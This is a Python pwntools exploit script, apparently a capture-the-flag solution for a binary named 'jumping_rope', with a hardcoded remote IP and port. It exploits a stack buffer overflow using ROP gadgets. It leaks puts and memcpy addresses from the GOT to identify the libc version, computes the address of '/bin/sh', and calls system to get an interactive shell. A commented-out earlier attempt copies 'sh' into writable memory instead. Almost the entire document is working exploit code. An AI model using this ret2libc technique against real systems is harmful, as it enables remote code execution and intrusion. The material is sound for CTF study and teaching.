from pwn import * 

# Protection 
## NX enabled 
## ASLR enabled 

### First idea to solve this challenge , turns out the payload wouldnt fit on the buffer 




"""
## buffer overflow at memcpy function , offset to eip 24 , we also have an address where we call system with the argument "ls" , jumping there and exploiting the overflow , will just ls the directory  
## We can exploit this by calling memcpy and replace the "ls" on the .BSS with "sh" then we get a shell 

## Since we are working with x64 binary , some calling conventions are needed for memcpy function,  we are obliged to put src on rsi register , and destination on rdi , So some ROP gadgets are needed 

#  0x0000000000401249 : pop rsi ; pop r15 ; ret (some junk is needed) 
pop_rsi_pop_r15_ret = p64(0x401249) 

# 0x000000000040124b : pop rdi ; ret 
pop_rdi_ret = p64(0x40124b) 


_memcpy = p64(0x401060)
_system = p64(0x401040)
#0x00000000004002bf : 's'
#0x0000000000401036 : 'h'
_caracter_s = p64(0x402005)
_caracter_h = p64(0x401036)
junkdata = p64(0xDEADBEEF)
# Address we overwrite on unitizlis segment 0x404063
adr_unintialized_segment_1 = p64(0x404062) # with write permissions 
adr_unintialized_segment_2 = p64(0x404063)

# we copy s 
payload = 16*b"Y" + b"\xAA"*8 + pop_rsi_pop_r15_ret + _caracter_s  + junkdata + pop_rdi_ret + adr_unintialized_segment_1 + _memcpy

# we do it again for "h" caracter 
payload  += pop_rsi_pop_r15_ret + _caracter_h + junkdata +pop_rdi_ret + adr_unintialized_segment_2 + _memcpy
#  that trick we did now we have rdi points to our "sh" again because of calling conventions 
payload += pop_rdi_ret + adr_unintialized_segment_1
 
# then we call system 

payload += _system


## sendind payload 
conn = remote('3.69.29.243' , 1337)
print(hex(len(payload)))
print(conn.recvline())

print(conn.sendline(payload))

print(conn.recvline())
"""

def run():
	if local :
		context.terminal = ["gnome-terminal", "-e"]
		p = process('./jumping_rope')

	else :
		 p = remote('3.69.29.243' , 1337)
	return p 


local = True 

p = run()


## 2 idea , now i will try to leak some address , to get the libc version first 
# I will leak a function pointer such as _puts_offset

_puts_GOT = p64(0x404018)
_puts_PLT = p64(0x401030)

# Since it's x64 we need to put the arguments on rdi , calling convetions . 

# 0x000000000040124b : pop rdi ; ret 

# Leaking addreses shows that libc used is :
# libc6_2.31-0ubuntu9.2_amd64

pop_rdi_ret = p64(0x40124b) 

offset_rip = b"Y"*16 + b"b"*8

payload = offset_rip + pop_rdi_ret + _puts_GOT + _puts_PLT

p.readuntil(b'jump?\n')
p.sendline(payload) 
puts_offset = u64(p.readline().strip().ljust(8 , b'\x00')) 
print("[+] puts address at : "+hex(puts_offset))

## Searching on database , shows that there is multiple matches , lets leak another 2 functions 

__memcpy_GOT = p64(0x404030)
__fgets_GOT = p64(0x404028)
main = p64(0x40117C)
system = p64(0x401040)


payload = offset_rip + pop_rdi_ret + __memcpy_GOT + _puts_PLT + main

p = run()
p.recvuntil(b'?\n')
p.sendline(payload)

memcpy_offset = u64(p.readline().strip().ljust(8 , b'\x00'))
print("[+] memcpy offset at : "+hex(memcpy_offset))


payload = offset_rip + pop_rdi_ret + _puts_GOT + _puts_PLT + main

p = run()
p.recvuntil(b'?\n')
p.sendline(payload)

puts_offset = u64(p.readline().strip().ljust(8 , b'\x00'))
print("[+] puts offset at "+hex(puts_offset))
## looking into libc database turns out that 
str_bin_sh_offset = 0x18a156
puts_offset_libc = 0x0766b0

## now we can calculate base address of libc and address of str_bin_sh
libc_base = puts_offset - puts_offset_libc 
str_bin_sh_address = p64(libc_base + str_bin_sh_offset) 

print("[+] libc address at : "+hex(libc_base)) 
print("[+] /bin/sh address at : "+hex(u64(str_bin_sh_address))) 
 
## now we can leak the address of libc , and /bin/sh 
# so what we do is we leak the address we rejump to main we resend our payload 
payload = offset_rip + pop_rdi_ret +str_bin_sh_address  + system
print(p.recvuntil(b'?\n'))

p.sendline(payload)

p.interactive()

